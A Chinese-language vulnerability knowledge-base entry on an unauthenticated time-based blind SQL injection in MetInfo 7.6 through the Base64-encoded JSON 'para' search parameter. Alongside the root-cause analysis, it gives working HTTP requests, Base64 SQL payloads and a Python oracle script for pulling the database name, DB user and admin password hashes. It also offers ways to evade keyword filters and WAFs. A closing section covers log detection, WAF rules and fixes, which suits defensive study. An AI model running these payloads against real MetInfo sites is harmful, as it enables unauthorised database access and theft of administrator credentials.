---
id: web-generic-sqli-metinfo-search-para-base64-blind
title: MetInfo 7.6 前台 search/para Base64 JSON 未授权 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: metinfo-search-para-base64-sqli
tags:
- sqli
- php
- metinfo
- base64
- json
- time-based-blind
- unauth
cve: []
severity: critical
confidence: high
status: verified
affected_versions: MetInfo v7.6
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V3
  verified_at: '2026-11-04T21:52:20+08:00'
  notes: 已对照原文与 23 张图片核对：get_search_list_sql 的 id/info 拼接、base64_decode(json_decode) 使前置 daddslashes/sqlinsert 过滤失效、search_info 的 para 分支、download/news 等未重写 get_list_by_class_sql 的模块、时间盲注请求与提取 database=metinfo_t/user=root@/admin 凭据结果均一致；原文无 CVE；MetInfo v7.6 已按原文写入 versions；PoC 未执行。
url: /docs/web/generic/sqli/web-generic-sqli-metinfo-search-para-base64-blind/
draft: false
kb_aliases:
- MetInfo SQL 注入
- MetInfo 7.6 SQL 注入
- para 参数注入
- search=search 注入
- met_plist 时间盲注
---

## 一句话结论

MetInfo 7.6 前台 `search=search&para=<base64(json)>` 会把 Base64 解码后的 JSON 键值直接拼进 `met_plist` 查询的 `id` 位置，前置的 `daddslashes`/关键字过滤只作用于编码前的表单值，因而可未授权注入并时间盲注读出数据库名、用户与管理员密码哈希。

## 原理

调用链与漏洞成因：

1. 入口 `app/system/.../index.php` 定义模块/类/动作后加载 `app/system/entrance.php`，`common::__construct()` 调用 `load_form()`，把 `$_GET`、`$_POST`、`$_COOKIE` 经 `daddslashes()` 处理后写入全局 `$_M['form']`。
2. 前台未定义 `IN_ADMIN` 时，`daddslashes()` 只做 `addslashes()`；即使后台分支调用 `sqlinsert()`，后者也只对**传入的字符串**做关键字替换（`select`、`union`、`sleep`、`*`、`%27` 等），而 `para` 的值此时是 Base64 文本，不含 SQL 关键字。
3. `search_info()` 在 `$_M['form']['para']` 存在时执行 `json_decode(base64_decode($_M['form']['para']), true)`，把解码后的数组转成 `array('id' => $key, 'info' => $val)`，并返回 `type=array`、`para.status=1`、`precision=0` 的搜索条件。
4. `base_label::get_list_page()` 调用 `search()` 取得该条件，再调用 `database->get_list_by_class(..., $cond, ...)`。
5. `base_database::get_list_by_class_sql()` 命中 `$cond['para']['status'] && $cond['para']['info']` 分支，调用 `parameter_label::get_search_list_sql()`。
6. Sink 中 `$val['id']` 被直接拼进 `WHERE id={$val['id']}`，`$val['info']` 拼进 `info='...'`；`$val['id']` 正是 Base64 JSON 的**键名**，解码后重新出现了引号和 SQL 关键字，绕过了第 2 步的过滤。

因此这是“过滤发生在 Base64 解码之前、Sink 使用解码之后的值”导致的前置过滤失效；同时 `id` 位置没有做整数强制转换或参数化。

## 触发条件

- MetInfo v7.6；
- 目标模块的模板中存在 `<tag action="模块.list" ...>` 一类标签，会触发 `module_tag::_list()` → `get_list_page()`；
- 该模块的 `*_database` 类**没有重写** `get_list_by_class_sql()`（`job` 模块重写了，`download`、`news` 等模块可走父类实现）；
- 前台无需登录，能访问对应模块的 `index.php`；
- `search=search` 且 `para` 为 Base64(JSON)；
- 数据库为 MySQL，支持 `SLEEP()`/`IF()`。

## 利用步骤

1. **定位 Sink**：从 `parameter_label::get_search_list_sql()` 的 `id`/`info` 拼接处向上追 `get_list_by_class_sql()`、`get_list_page()`、`search()`、`search_info()`。
2. **确认入口**：`search_info()` 需要 `$_M['form']['search']` 为真，且走 `elseif ($_M['form']['para'])` 分支；因此传 `search=search` 与 `para=<base64>`。
3. **找可用模块**：全局搜索 `get_list_page` 的调用，排除重写了 `get_list_by_class_sql()` 的模块；文章选中 `download`（`/download/index.php`），`news` 等也可尝试。
4. **构造 payload**：JSON 的键放注入语句，值任意。例如 `{"1' OR SLEEP(0.1)-- -":"x"}`，Base64 后为 `eyIxJyBPUiBTTEVFUCgwLjEpLS0gLSI6IngifQ==`。
5. **验证时间盲注**：发送请求并测量响应时间；用 `IF(condition,SLEEP(0.5),0)` 做布尔-时间 oracle。
6. **提取数据**：逐字符二分 `ASCII(SUBSTR((SELECT ...),pos,1))`，读取 `database()`、`user()`、`met_admin_table` 的 `admin_id`/`admin_pass`；MD5 哈希可离线破解。

## PoC

最小验证请求：

```http
GET /download/index.php?search=search&para=eyIxJyBPUiBTTEVFUCgwLjEpLS0gLSI6IngifQ== HTTP/1.1
Host: target
```

`para` 解码后：

```json
{"1' OR SLEEP(0.1)-- -":"x"}
```

条件盲注（`IF` 为真时延迟约 0.5 秒）：

```json
{"x' OR IF(1=1,SLEEP(0.5),0)-- -":"200"}
```

Base64：

```text
eyJ4JyBPUiBJRigxPTEsU0xFRVAoMC41KSwwKS0tIC0iOiIyMDAifQ==
```

核心提取逻辑（最小化）：

```python
import base64, json, time, urllib.request

BASE = "http://target/download/index.php?search=search&para={}"

def enc(info, key="200"):
    return base64.b64encode(
        json.dumps({key: info}, separators=(",", ":")).encode()
    ).decode()

def oracle(cond):
    payload = "x' OR IF({},SLEEP(0.5),0)-- -".format(cond)
    url = BASE.format(enc(payload))
    t0 = time.time()
    try:
        urllib.request.urlopen(url, timeout=10)
    except Exception:
        pass
    return time.time() - t0 > 0.5

# 示例：判断 database() 首字符是否大于 64
print(oracle("ASCII(SUBSTR((SELECT DATABASE()),1,1))>64"))
```

原文脚本还针对 `sqlinsert()` 的关键字黑名单做了处理：若 Base64 结果本身包含 `select`/`sleep` 等子串，会在 payload 末尾补空格（位于 `-- -` 注释内，不影响 SQL）后重新编码，直到 Base64 文本不命中黑名单。

## 变体与关联

- 变体：`news` 等其他未重写 `get_list_by_class_sql()` 的模块；`info` 位置同样可注入，可用 UNION/报错注入（若回显）替代时间盲注；`id` 位置可尝试布尔盲注。
- 变体：若目标在后台上下文启用了 `sqlinsert()`，可用大小写、注释、内联注释、编码或空格补位规避关键字替换；`%27` 等 URL 编码在进入 `$_GET` 前已被解码，需按实际过滤顺序调整。
- 关联：[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（其他 DBMS 的注入后命令执行）；[[defense-detection-logstash-nginx-sqli-tagging]]（访问日志识别 `para=` Base64 与 `search=search` 组合）。
- 不确定点：文章未给出官方 CVE 编号；不同版本/主题可能重写 `get_list_by_class_sql()` 或改变模板标签，需按目标代码确认；管理员表前缀可能不是默认 `met_`。

## 检测与防御

- **日志检测**：前台请求出现 `search=search` 且 `para` 为较长 Base64；解码后 JSON 键/值含 `'`、`SLEEP`、`IF(`、`SUBSTR`、`ASCII`、`SELECT` 等；同一 IP 对 `download/news` 等模块高频请求且响应时间规律性波动（时间盲注）。
- **WAF**：先对 `para` 做 Base64 解码和 JSON 解析，再检查键名与值；不能只看原始 URL 编码文本。
- **修复**：`get_search_list_sql()` 中把 `id` 强制转换为整数（`intval`）并对 `info` 使用参数化查询/预处理；不要在 SQL 中拼接解码后的用户输入；升级到修复版本。
- **加固**：数据库账户最小权限；关闭不必要的模块；对搜索接口做频率限制；错误页不返回 SQL 报错；管理员密码哈希使用强算法并定期轮换。
